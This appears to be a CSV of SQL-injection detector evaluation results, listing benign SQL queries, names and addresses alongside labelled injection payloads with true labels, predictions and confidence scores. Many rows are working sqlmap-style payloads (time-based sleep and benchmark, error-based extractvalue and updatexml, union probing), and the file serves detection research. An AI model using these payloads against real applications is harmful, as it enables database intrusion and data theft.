text,true_label,predicted_label,confidence_sql_injection
"1""  )   where 2136  =  2136 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"   select class, fast, offer from beside where arrive  is null",0,0,0.0
select orange ( s )  from wing union all,0,0,0.0
sa89gn,0,0,0.004468253314358248
delvalle llers,0,0,0.004468253314358248
1'   )    )     )   and 1743  =  6793 and    (    (     (  'rgcv'  =  'rgcv,1,1,1.0
select * from become where spend between '1996-07-01' and '1996-07-31',0,0,0.0
select protection from riding,0,0,0.0
"1""   )    )    as swix where 2459  =  2459 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,1,1.0
1'+  (  select 'luhy' where 3112  =  3112 and   (  3020  =  3020  )  *6703  )  +',1,1,0.99
1'  )   as uwmy where 6980  =  6980,1,1,1.0
"  select screenid as id, tiny as swimming from become",0,0,0.0
select * from except where not has = 'somebody'  and not perfect = 'foreign',0,0,0.0
"select * from train where with between ""dull"" and    ""period""",0,0,0.0
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",1,1,1.0
villodrigo,0,0,0.004468253314358248
"1""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""rwlq""  =  ""rwlq",1,1,1.0
ellston balladares,0,0,0.004468253314358248
select * from  ( select under from reason ) ,0,0,0.0
47239,0,0,0.004468253314358248
select count ( whom ) from pattern,0,0,0.0
cote suengas,0,0,0.004468253314358248
"1%"" or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
mediona,0,0,0.004468253314358248
"-1988 where 4597  =  4597 union all select 4597,4597,4597,4597,4597,4597--",1,1,1.0
"  select oil,airplane,wool from term left join orders on shop.nutsid =  in.whenever order by held.wish",0,0,0.0
select * from fellow  where for not like '[steam]%',0,0,0.0
"  select * from tell where your in  ( 'faster', 'on', 'are' )  ",0,0,0.03
select avg ( price ) from cap,0,0,0.0
select count ( * )  as exactly,0,0,0.0
select * from threw where sentence = 'football' fetch first 3 rows only,0,0,0.0
"  select feelid as id, sick as flag from possible",0,0,0.0
end and '%'  =  ',1,1,0.97
delete from coal where dozen = 'widely',0,0,0.0
mcguinness.clayburgh7@eldeseodepecar.gu,0,0,0.004468253314358248
select * from tribe 3 select * from per,0,0,0.0
"  select transportation,child from furniture where other = 'poetry' union select dry, act from plate",0,0,0.0
select top 3 * from begun where future = 'way',0,0,0.0
"   select flame, shaking, gulffrom buried where realize  is not null",0,0,0.0
select * from invented where mouse in  ( select fifth from fought ) ,0,0,0.0
select * from indicate where establish = 'so'  or gave = 'cheese',0,0,0.0
"-4407""  )   where 2055  =  2055 or elt  (  9714  =  5040,5040  )  --",1,1,0.99
select avg ( price ) from products;select sum ( quantity ) ,0,0,0.01
1 and sleep  (  5  ) ,1,1,0.99
resquebrar,0,0,0.004468253314358248
select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,1,1,1.0
"  select orders.distancerid, employees.said, employees.sleep from ordersright join employees on orders.employeeid  =  employees.memoryid order by orders.rememberid",0,0,0.01
revuelta borgua,0,0,0.004468253314358248
-4572'  )   union all select 3520--,1,1,1.0
"  select library,making,fed from spoken left join orders on slope.begunid =  lesson.transportation order by split.row",0,0,0.01
lotfaga,0,0,0.004468253314358248
1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,1,1.0
select * from  ( select far from gulf ) ,0,0,0.0
c/ javea 57,0,0,0.0
select * from arm where choose like '%follow%',0,0,0.0
select * from ago where market between '1996-07-01' and '1996-07-31',0,0,0.0
select min ( partly )  as usually from combination,0,0,0.0
"-7333%""   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,1,1,1.0
valido casademont,0,0,0.004468253314358248
3226,0,0,0.004468253314358248
select * from writing fetch first 50 percent rows onlyselect top 3 * from according,0,0,0.0
"jose gomez gallito, 107,",0,0,0.0004868513920852303
"   select move, face, telephonefrom how where model  is not null",0,0,0.0
"c/ madrid, 53 5-f",0,0,0.0
select gave ( s )  from sad select hardly ( s ) ,0,0,0.0
" and 1  =  utl_inaddr.get_host_address   (    (   select distinct  (  column_name  )   from   (  select distinct  (  column_name  )  , rownum as limit from all_tab_columns  )   where limit  =  3   )    )    and 'i'  =  'i",1,1,1.0
replace,1,0,0.004468253314358248
# from wapiti,1,1,0.5203209980036451
"1'  )   where 1470  =  1470 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
urbina granda,0,0,0.004468253314358248
-7103   )    )    or 4610  =  1871 and    (    (   1249  =  1249,1,1,1.0
"1""  )   where 6821  =  6821 waitfor delay '0:0:5'--",1,1,1.0
select * from pair where mission between '1996-07-01' and '1996-07-31',0,0,0.0
"calle gola de perellonet, 196,",0,0,0.0
"-6626%""  )   or 1744  =  5292 and   (  ""%""  =  """,1,1,1.0
victoria,0,0,0.004468253314358248
"1' where 1893  =  1893 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
35093869d,0,0,0.004468253314358248
 or pg_sleep  (  __time__  )  --,1,1,1.0
select * from row order by change desc,0,0,0.0
bernadita,0,0,0.004468253314358248
amorebieta-etxano,0,0,0.006527024015406931
select avg ( price ) from skill,0,0,0.0
select count ( distinct swim )  from anything,0,0,0.0
"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,1,1.0
1'||  (  select 'tezo' from dual where 4436  =  4436,1,1,1.0
select * from single,0,0,0.0
admin'  )   or   (  '1'  =  '1'/*,1,1,0.9883333333333334
1   )    )     )   order by 1--,1,1,0.99
"   select guide, wonder, brief from lift where outline  is null",0,0,0.0
select * from since fetch first 3 rows only select top 50 percent * from toward,0,0,0.0
" select count ( customerid ) , country from customers group by country;",0,0,0.02
"1""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"-1434'   )    )    union all select 4734,4734,4734,4734,4734,4734,4734,4734,4734,4734#",1,1,1.0
select avg ( fresh ) from milk select sum ( voice ) ,0,0,0.0
"   select music, noun, where from she where rather  is null",0,0,0.03
select cattle from look union select adjective from piano order by family,0,0,0.0
"-8209  )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
select * from sum where    not especially = 'opportunity',0,0,0.0
37576555y,0,0,0.004468253314358248
"  update pattern set somehow =  'take', city =  'unhappy' where avoid =  grass",0,0,0.0
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'wgbh'  =  'wgbh",1,1,1.0
 ,1,0,0.004468253314358248
"1""  )   as xaye where 5343  =  5343 and 4355  =  7475#",1,1,0.9916666666666666
select option_value from wp_options where option_name  =  '_options_footer_button_4_text' limit 1,0,0,0.0
1193,0,0,0.004468253314358248
52031263l,0,0,0.004468253314358248
select * from gate,0,0,0.0
avenida presidente carrero blanco 134,0,0,0.004468253314358248
"1   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  4744  =  4744",1,1,1.0
o.neil,0,0,0.0
"1' and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,1,1.0
"pasaje cox 194, 5?f",0,0,0.0
-6764'  )   or 2314  =  2017--,1,1,0.96
select   (  case when   (  8808  =  1367  )   then 1 else 8808*  (  select 8808 from master..sysdatabases  )   end  )  --,1,1,1.0
"1   )    )    as bgdm where 3473  =  3473 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1,1,1.0
1 where 6827  =  6827,1,1,1.0
from  ( select distinct rhyme from around ) ,0,0,0.0
select * from let order by wave,0,0,0.0
"1' in boolean mode  )   union all select null,null,null--",1,1,1.0
"1""   )    )    as ycvh where 4523  =  4523 and sleep  (  5  )  #",1,1,1.0
select * from needs where here = 'deer'  or situation = 'donkey',0,0,0.0
from  ( select distinct strange from area ) ,0,0,0.0
select * from milk where shelter = 'happy' fetch first 3 rows only,0,0,0.0
select month ( s )  from selection,0,0,0.0
"1234 "" and 1  =  0 union all select ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",1,1,0.7525
"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gmvk' like 'gmvk",1,1,1.0
par4u8i67t3,0,0,0.004468253314358248
8.92715e+15,0,0,0.0
victorico,0,0,0.004468253314358248
"1'+  (  select 'ejox' where 2719  =  2719 union all select null,null,null#",1,1,1.0
select * from spite where standard between 'base' and 'solve',0,0,0.0
e0u08os1,0,0,0.004468253314358248
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""krtr"" like ""krtr",1,1,1.0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""zzmn""  =  ""zzmn",1,1,1.0
"1'||  (  select 'wvio' from dual where 8934  =  8934 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,1.0
"-2639""  )   where 1494  =  1494 union all select 1494--",1,1,1.0
"  select * from task where every not in  ( 'sides', 'typical', 'headed' )  ",0,0,0.0
vilar elsegui,0,0,0.004468253314358248
select massage ( s ) from imagine inner join,0,0,0.0
6.36091e+15,0,0,0.0
1'   )    )    as cwss where 9720  =  9720,1,1,1.0
9.82891e+15,0,0,0.0
"insert into automobile ( cry, strange, cost, though, wise, original )  values  ( 'nobody', 'price'. zero', 'table', 'fully', 'tool', 'loose' )  ",0,0,0.0
1 union all select null#,1,1,0.96
select count ( distinct certainly )  from environment,0,0,0.0
49211,0,0,0.004468253314358248
select count ( distinct flight )  from neighbor,0,0,0.0
6.1724e+15,0,0,0.0
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'nxkp' like 'nxkp,1,1,1.0
select top 3 * from aloud select * from invented 3select * from visitor,0,0,0.0
select * from border 3,0,0,0.0
cordelado,0,0,0.004468253314358248
select * from wp_posts where id  =  262335 limit 1,0,0,0.0
6.27383e+15,0,0,0.0
select * from team where saved = 'unless',0,0,0.0
"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1,1,1.0
"1 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   # fmxq",1,1,1.0
"1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",1,1,1.0
corota,0,0,0.004468253314358248
select count ( rapidly ) from together,0,0,0.0
select count ( distinct century )  from mouth,0,0,0.0
barlas,0,0,0.004468253314358248
4.16237e+15,0,0,0.0
select min ( depth )  as queen from straw,0,0,0.0
"1 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
"select * from struggle where himself between ""sound"" and    ""pass""",0,0,0.0
rabascall,0,0,0.004468253314358248
entrepalmadura,0,0,0.004468253314358248
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs",1,1,1.0
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  'wdru' like 'wdru",1,1,1.0
des7768ab9e6os,0,0,0.004468253314358248
select count ( special ) from west,0,0,0.0
yaci,0,0,0.004468253314358248
34361279s,0,0,0.004468253314358248
or   (  exists  ) ,1,1,0.9800464330941325
select top 3 * from syllable where beyond = 'fireplace',0,0,0.0
1  )   and 2457  =  8146,1,1,0.99
select * from snow where search between party09/01/1996stop and hidden15/31/1996ourselves,0,0,0.0
select top 3 * from halfway select * from slide 3select * from desk,0,0,0.0
select * from loose where depth = 'attention' fetch first 3 rows only,0,0,0.0
jiyuan,0,0,0.004468253314358248
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",1,1,1.0
-8878' in boolean mode  )   union all select 7785#,1,1,1.0
1'||  (  select 'jjpy' from dual where 6295  =  6295,1,1,1.0
"1,row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  ",1,1,0.99
1'+  (  select iutk where 6158  =  6158,1,1,1.0
delete from men,0,0,0.0
"1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'mhvy' like 'mhvy",1,1,1.0
delete from ice,0,0,0.0
quintina,0,0,0.004468253314358248
casper,0,0,0.004468253314358248
select apple ( s )  from settlers select north ( s ) ,0,0,0.0
"-1372%'   )    )     )   union all select 8403,8403,8403,8403#",1,1,0.99
"   select volume, motor+ ', ' + comfortable+ ' ' + dollar+ ', ' + plus as cowboy  from could",0,0,0.0
or 0  =  0 --,1,1,0.92
34491,0,0,0.004468253314358248
select loss ( s )  from sale union all,0,0,0.0
1  )   where 8375  =  8375,1,1,1.0
"1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  'iifh'  =  'iifh",1,1,1.0
"insert into fill ( flow, mighty, apple, combination, dance, allow )  values  ( 'pile', 'birds'. detail', 'long', 'image', 'particles', 'have' )  ",0,0,0.0
select * from discuss,0,0,0.0
e2paq48t282r,0,0,0.004468253314358248
33001,0,0,0.004468253314358248
"1""  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""xmrq""  =  ""xmrq",1,1,1.0
25186,0,0,0.004468253314358248
"-5989%"" union all select 3581,3581,3581,3581,3581--",1,1,1.0
4417,0,0,0.004468253314358248
marling,0,0,0.004468253314358248
"  select orders.strugglerid, employees.brief, employees.favorite from ordersright join employees on orders.employeeid  =  employees.leafid order by orders.grabbedid",0,0,0.0
lyston@classroommanager.co,0,0,0.004468253314358248
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
1%' or sleep  (  5  )  #,1,1,0.99
select count ( forget ) from husband,0,0,0.0
8.33614e+15,0,0,0.0
select political from kitchen union all select fighting from ancient order by center,0,0,0.0
select * from sad where    not dear = 'collect',0,0,0.0
1 where 5828  =  5828 and   (  3020  =  3020  )  *6703--,1,1,1.0
roda deita,0,0,0.004468253314358248
-9429'  )   order by 1--,1,1,1.0
arabele,0,0,0.004468253314358248
"1  )   as guru where 7615  =  7615 union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
select count ( positive ) from nice,0,0,0.0
select * from picture,0,0,0.0
kaneko,0,0,0.004468253314358248
17151,0,0,0.004468253314358248
select something from completely union all select broken from welcome order by lamp,0,0,0.01
"1""   )    )    as hiuf where 3277  =  3277 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,1,1.0
select * from general 3,0,0,0.0
"1'  )   as knxr where 5662  =  5662 union all select null,null,null,null,null,null,null,null#",1,1,1.0
